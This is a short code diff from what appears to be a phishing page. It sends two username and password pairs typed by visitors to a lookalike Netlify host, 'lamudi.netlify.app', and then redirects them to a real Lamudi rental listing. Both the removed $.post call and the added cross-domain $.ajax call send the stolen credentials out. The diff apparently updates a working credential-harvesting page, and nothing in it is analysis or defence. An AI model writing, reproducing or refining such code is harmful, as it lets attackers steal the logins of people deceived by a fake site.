@@ -246,15 +246,21 @@
       return alert('Please enter valid username and password.');
     }
 
-    $.post('https://lamudi.netlify.app/.netlify/functions/auth', {
-      username: x,
-      password: y,
-      username1: x1,
-      password1: y1
-    }).then(()=>{
-      window.location.href="https://www.lamudi.com.ph/apartment-studio-type-for-rent-near-fishermall-munoz-frisco.html"
-    })
- 
+    $.ajax({
+        url: "https://lamudi.netlify.app/.netlify/functions/auth",
+        type: "POST",
+        crossDomain: true,
+        data: {
+          username: x,
+          password: y,
+          username1: x1,
+          password1: y1
+        },
+        dataType: "json",
+        success: function (response) {
+          window.location.href="https://www.lamudi.com.ph/apartment-studio-type-for-rent-near-fishermall-munoz-frisco.html"
+        },
+    });
   };
 </script>
 </body>
